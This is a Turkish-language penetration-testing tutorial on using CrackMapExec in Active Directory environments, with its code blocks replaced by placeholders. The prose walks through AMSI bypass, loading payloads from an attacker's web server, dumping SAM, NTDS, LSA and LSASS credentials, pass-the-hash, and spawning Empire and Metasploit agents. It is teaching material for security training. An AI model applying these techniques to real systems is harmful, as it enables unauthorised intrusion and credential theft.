WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz

Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:


### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).

Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.

----


### LDAP and RDP Enumeration

Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır

Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:

| Komut                                                                          | Açıklama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |

Henüz çalışmadıklarımız varsa onları gözden geçirelim.

### Enumerating Users and Groups

SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir


### İlginç Hesap Özelliklerini Numaralandırma

`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.


### PASSWD_NOTREQD Attribute Tanımlanması

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandırma

Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA), aşağıdakileri sağlayan yönetilen bir domain hesabıdır:

* Otomatik parola yönetimi.
* Basitleştirilmiş service principal name (SPN) yönetimi.
* Yönetimi diğer yöneticilere devretme yeteneği

Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.

Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.

Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.


### gMSA Parolasını Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.

### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.


### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.

Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.

Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:


### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.


---

### Command Execution

Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.

Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.


### Administrator Olarak Komut Yürütme

Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.


### Bir Komutu Administrator Olarak Çalıştırma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut Yürütme

Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:

### Komutu localadmin olarak çalıştırma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi Değiştirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain Hesabı Olarak Komut Yürütme

`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.


### Komutu Robert olarak çalıştır

{{CODE_BLOCK_153}}


### SMB ile Komut Yürütme

CME'nin dört (4) farklı komut yürütme yöntemi vardır:

| Komut   | Açıklama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |

Not: Her yöntem her bilgisayarda çalışmayabilir.

Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:


### SMBExec Yöntemi ile Komut Yürütme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:

### wmiexec aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_155}}


PowerShell seçeneği -X çalıştırıldığında, perde arkasında `CrackMapExec` aşağıdakileri yapacaktır:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Özel AMSI Bypass Çalıştırma

Bu teknikler `PowerShell` çalıştırılırken algılanabilir. Özel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seçeneğini ve ardından kullanmak istediğimiz payload'un yolunu kullanabiliriz. Örneğin, [AMSI Bypass Değiştirilmiş Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) Yamasını kullanalım. Bunu bir dosyaya kaydedeceğiz ve bu AMSI Bypass'ı bir web sunucusundan belleğe yüklemek için bir PowerShell scripti oluşturacağız. İşte adımlar:

*  “Modified Amsi ScanBuffer Patch” içeren dosyayı indirin


### “Modified Amsi ScanBuffer Patch” ile Bir Dosya Oluşturun

{{CODE_BLOCK_156}}


Payload'u olduğu gibi çalıştırmaya çalışırsak, komut maksimum uzunluk olan 8191 karakteri aşacağı için başarısız olacaktır

### Komut Maksimum Uzunluğu Aşıyor

{{CODE_BLOCK_157}}

* Bu sorunu çözmek için, `shantanukhande-amsi.ps1` dosyasını indiren ve çalıştıran bir PowerShell scripti oluşturalım. Ayrıca scriptimizi barındırmak için bir Python web sunucusu oluşturmamız gerekecek.

### PowerShell Komut Dosyasını Oluşturma ve Barındırma

{{CODE_BLOCK_158}}


Not: Sonuna noktalı virgül (;) eklediğinizden emin olun.

Başka bir terminalden, yeni AMSI bypass payload'umuzu çalıştıralım:

### PowerShell Özel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut Yürütme

WinRM protokolü ile de komutları çalıştırabiliriz. Varsayılan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yı dinler. Bu protokolle ilgili özel bir şey, bir kullanıcının komutları yürütmek için `administrator` olmasını gerektirmemesidir. `Administrators` grubunun üyesiysek, `Remote Management Users` grubunun üyesiysek veya oturum yapılandırmasında açık `PowerShell Remoting` izinlerimiz varsa WinRM protokolünü kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracılığıyla PowerShell Komut Yürütme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yürütme ile kullanabileceğimiz çeşitli seçenekler vardır. Bunlardan bazılarını görelim:

| Seçenek           | Açıklama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM bağlantısı için özel bir port seçmek.             |
| --ssl             | SSL etkinleştirilmiş WinRM'ye bağlanmak.                |
| --ignore-ssl-cert | SSL ile bağlanırken sertifika doğrulamasını yok saymak. |

Not: WinRM protokolü farklı yürütme yöntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows üzerinde komutları çalıştırmak için SSH protokolünü de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileşime girmenin bir başka yaygın yolu da `public` ve `private` keyleri kullanmaktır. CrackMapExec, `--key-file` seçeneği ile `private key` kullanımını destekler. Anahtarın çalışması için `OPENSSH` formatında olması gerekir.

### Private Key Kullanarak SSH ile Komut Yürütme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“”)` olarak ayarlamalıyız, aksi takdirde bir hata alırız

Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.


### Gizli Bilgileri Bulma ve Kullanma

Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.

Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.


### SAM

SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz

Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.

### Domain Controller üzerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.

### Yalnızca KRBTGT Hesabının Dump Edilmesi

{{CODE_BLOCK_166}}

Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.


### Yalnızca Enabled Hesapları Gösterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır


### LSA'yı inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile başlayan hash formatı `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayıf bir parola belirlenmişse `Hashcat` kullanılarak kırılabilir çünkü bu algoritma `NTLM`'den çok daha güçlüdür. Ayrıca, Domain Cached Credential hash'leri `Pas the Hash` saldırısı için kullanılamaz. Bunları kırmak için, domain ve kullanıcı adını kaldırmamız, `$DCC2$` 'den sonraki değeri almamız ve Hashcat modül 2100'ü kullanmamız gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleği, Windows parolalarını `açık metin` olarak veya `NTLM` veya `AES256/AES128` gibi diğer hash biçimlerini içerir. Belleği dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak için etkili bir yol olabilir.

CrackMapExec, LSASS process belleğinin içeriğini dump etmek için çeşitli modüller içerir. Bunlardan bazılarını görelim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracı, bir dizi host üzerindeki kimlik bilgilerini remote olarak ayıklamak için kullanılır. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazısı nasıl çalıştığını açıklamaktadır. Bu araç, bir LSASS dump'ındaki gerekli baytları remote okumak için `Impacket` projesini ve kimlik bilgilerini çıkarmak için `pypykatz` kullanır.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluşturmak için Sysinternals'tan Microsoft `Procdump`'ı ve kimlik bilgilerini çıkarmak için `pypykatz`'ı kullanır.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracı, **LSASS**'e ait kopyalanmış **handle**'ların kullanımını göstererek, aynı **process**'in **gizlenmiş** bir bellek dump'ını oluşturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'ını oluşturan esnek bir araçtır. **LSASS**'e bir **handle** açmak tespit edilebileceğinden, **Nanodump** mevcut **handle**'ları arayabilir. Eğer bir **handle** bulunursa, bunu kopyalayıp **minidump** oluşturmak için kullanır. Ancak, böyle bir **handle** bulunacağının garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bölgesi veya başka bir kaynak** ile etkileşime geçmesini sağlayan **benzersiz bir tanımlayıcıdır**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bölümde bir bilgisayardan veya domain'den kimlik bilgilerini almak için farklı yöntemler gösterilmektedir. Bir sonraki bölümde CrackMapExec'in bir C2 framework ile birlikte kullanımı incelenecektir.

---


### Bir **C2 Framework** içinde **session**'ları alma.

CrackMapExec ile ilginç olabilecek bir şey, birden fazla hedefi tehlikeye attığımızda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak çalışmak isteyebiliriz. Her hedef makinede bir payload çalıştırmak ve C2'mize bir `agent` almak için CrackMapExec'i kullanabiliriz.

Bu bölümde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modül ele alınacaktır. Ayrıca farklı bir C2 framework'ü kullanırsak bir alternatif de keşfedeceğiz.


### Empire

Web sitelerinde sağlanan [kılavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'ü yükleyerek başlayacağız


### Empire Server'ı Kurun ve Başlatın

{{CODE_BLOCK_176}}

Daha sonra Empire'ı seçtiğimiz kullanıcı adı ve şifre ile çalıştırmamız gerekiyor. Biz `empireadmin` kullanıcı adını ve `asdasd123` şifresini kullanacağız! .


### Empire'ı Özel Kullanıcı Adı ve Parola ile Çalıştırma

{{CODE_BLOCK_177}}

Ardından, CrackMapExec yapılandırma dosyasını ve Empire client yapılandırma dosyasını seçtiğimiz kullanıcı adı ve parolayla eşleşecek şekilde düzenlememiz gerekir.

CrackMapExec yapılandırma dosyası varsayılan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seçeneğini `empireadmin` kullanıcı adı ve `asdasd123` şifresiyle eşleşecek şekilde değiştirmemiz gerekiyor! . Varsayılan olarak, Empire local server `1337` portunda çalışır. CrackMapExec yapılandırma dosyasında değiştirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


Aynı şeyi Empire yapılandırma dosyası için de yapmamız gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### İnceleme

{{CODE_BLOCK_179}}


Yapılandırma dosyaları değiştirildikten sonra, Empire client ile Empire sunucusuna bağlanmalıyız

{{CODE_BLOCK_180}}

Şimdi listener'ı ayarlamamız gerekiyor ve host'u IP adresimize ve Port'u da aracının bağlanacağı TCP 8001'e ayarlayacağız.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

Artık listener'ımız çalışıyor ve `empire_exec` modülü ile Empire'a bir `agent` almak için CrackMapExec'i kullanabiliriz. Ayarladığımız listener olan `LISTENER=http` seçeneğini eklememiz gerekiyor.


### CrackMapExec Modülünü Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu çalıştırdığımızda, PowerShell Empire'da yeni bir agent görmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

Aynı şeyi CrackMapExec modülü `web_delivery` kullanarak Metasploit Framework üzerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modülünü yapılandırmamız ve sağlanan URL'yi CrackMapExec modülümüze bir parametre olarak kullanmamız gerekir. Msfconsole'u başlatalım ve `web_delivery` handler'ını yapılandıralım


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapılandırıldıktan sonra web_delivery modülünü kullanabiliriz. `URL` ve `PAYLOAD` olmak üzere iki seçeneği destekler. URL seçeneğini Metasploit tarafından sağlanan URL ile ayarlamamız gerekir ve PAYLOAD seçeneği seçtiğimiz payload mimarisine karşılık gelir. Eğer `x64` kullanıyorsak, `x64` varsayılan değer olduğu için bu seçeneği atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. Eğer `32 bit` payload kullanıyorsak `PAYLOAD=32` seçeneğini ayarlamamız gerekir. Şimdi bunu çalışırken görelim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum görmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

Başka bir C2 Framework kullanmak istediğimizde, **Command Execution** bölümünde bahsedilen (SMB, WinRM, SSH) yöntemleri kullanarak aynı sonucu elde edebiliriz. Örneğin, bir **PowerShell** payload'u oluşturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip çalıştırmak için **-X** seçeneğiyle bir PowerShell komutu çalıştırabiliriz. Ayrıca, işlemi arka planda yürütmek için **`--no-output`** seçeneğini seçmemiz gerekecektir.

Örnek olarak Metasploit'i kullanalım ve modülü kullanmak yerine web_delivery payload'unda sağlanan PowerShell script'ini kopyalamayı deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

